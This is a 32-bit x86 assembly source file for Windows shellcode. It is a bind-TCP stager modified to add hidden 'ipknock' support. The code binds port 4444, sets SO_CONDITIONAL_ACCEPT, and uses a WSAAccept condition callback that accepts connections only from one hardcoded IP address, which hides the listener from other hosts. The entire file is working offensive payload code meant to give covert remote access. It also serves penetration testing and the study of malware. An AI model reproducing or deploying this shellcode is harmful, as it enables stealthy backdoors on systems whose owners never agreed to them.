;-----------------------------------------------------------------------------;
; Original Shellcode: Stephen Fewer (stephen_fewer@harmonysecurity.com)
; Modified version to add hidden ipknock bind shell support: Borja Merino (bmerinofe@gmail.com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (December 2014)
;-----------------------------------------------------------------------------;
[BITS 32]

; Input: EBP must be the address of 'api_call'.
; Output: EDI will be the newly connected clients socket
; Clobbers: EAX, EBX, ESI, EDI, ESP will also be modified (-0x1A0)

bind_tcp:
  push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
  push 0x5F327377        ; ...
  push esp               ; Push a pointer to the "ws2_32" string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "ws2_32" )
  
  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
  sub esp, eax           ; alloc some space for the WSAData structure
  push esp               ; push a pointer to this stuct
  push eax               ; push the wVersionRequested parameter
  push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
  call ebp               ; WSAStartup( 0x0190, &WSAData );
  
  push eax               ; if we succeed, eax wil be zero, push zero for the flags param.
  push eax               ; push null for reserved parameter
  push eax               ; we do not specify a WSAPROTOCOL_INFO structure
  push eax               ; we do not specify a protocol
  inc eax                ;
  push eax               ; push SOCK_STREAM
  inc eax                ;
  push eax               ; push AF_INET
  push 0xE0DF0FEA        ; hash( "ws2_32.dll", "WSASocketA" )
  call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
  xchg edi, eax          ; save the socket for later, don't care about the value of eax after this
  
  xor ebx, ebx           ; Clear EBX
  push ebx               ; bind to 0.0.0.0
  push 0x5C110002        ; family AF_INET and port 4444
  mov esi, esp           ; save a pointer to sockaddr_in struct
  push byte 16           ; length of the sockaddr_in struct (we only set the first 8 bytes as the last 8 are unused)
  push esi               ; pointer to the sockaddr_in struct
  push edi               ; socket
  push 0x6737DBC2        ; hash( "ws2_32.dll", "bind" )
  call ebp               ; bind( s, &sockaddr_in, 16 );

  ; Hidden ipknock Support  ----------

  push 0x1               ; size, in bytes, of the buffer pointed to by the "optval" parameter
  push esp               ; optval: pointer to the buffer in which the value for the requested option is specified
  push 0x3002            ; level at which the option is defined: SOL_SOCKET
  push 0xFFFF            ; the socket option for which the value is to be set: SO_CONDITIONAL_ACCEPT
  push edi               ; socket descriptor
  push 0x2977A2F1        ; hash( "ws2_32.dll", "setsockopt" )
  call ebp               ; setsockopt(s, SOL_SOCKET, SO_CONDITIONAL_ACCEPT, &bOptVal, 1 );

  push ebx               ; backlog
  push edi               ; socket
  push 0xFF38E9B7        ; hash( "ws2_32.dll", "listen" )
  call ebp               ; listen( s, 0 );
condition:
  push ebx                ; dwCallbackData (ebx = 0, no data needed for the condition function)
  call wsaaccept          ; push the start of the condition function on the stack
  mov eax, DWORD [esp+4]  ;
  mov eax, DWORD [eax+4]  ;
  mov eax, DWORD [eax+4]  ; get the client IP returned in the stack
  sub eax, 0x2101A8C0     ; compare the client IP with the IP allowed
  jz equal                ; if equal, eax = 0
  xor eax, eax
  inc eax                 ; if not equal, eax = 1
equal:
  mov DWORD [ebp+84], eax ; save the value of eax out of the scope of the callback.
                          ; This value will be read it after calling WSAaccept since
                          ; WSAaccept would always return FFFFFFFF when the IP is spoofed
  retn 0x20               ; some stack alignment needed to return to mswsock

wsaaccept:
  push ebx                ; length of the sockaddr = nul
  push ebx                ; struct sockaddr = nul
  push edi                ; socket descriptor
  push 0x33BEAC94         ; hash( "ws2_32.dll", "wsaaccept" )
  call ebp                ; wsaaccept( s, 0, 0, &fnCondition, 0)
  cmp DWORD [esp+4], 0
  jnz condition           ; Check if the IP knocked is allowed
  inc eax
  jnz connection          ; Check if the 3-Way Handshake is successfully established
  push ebx                ; dwCallbackData (ebx = 0, no data needed for the condition function)
  push ebx                ; fnCondition = 0
  jmp wsaaccept
  jz condition            ; if error (eax = -1) jump to condition function to wait for another connection

connection:
  dec eax     ; restore eax
  push edi                ; push the listening socket to close
  xchg edi, eax           ; replace the listening socket with the new connected socket for further comms
  push 0x614D6E75         ; hash( "ws2_32.dll", "closesocket" )
  call ebp                ; closesocket( s );
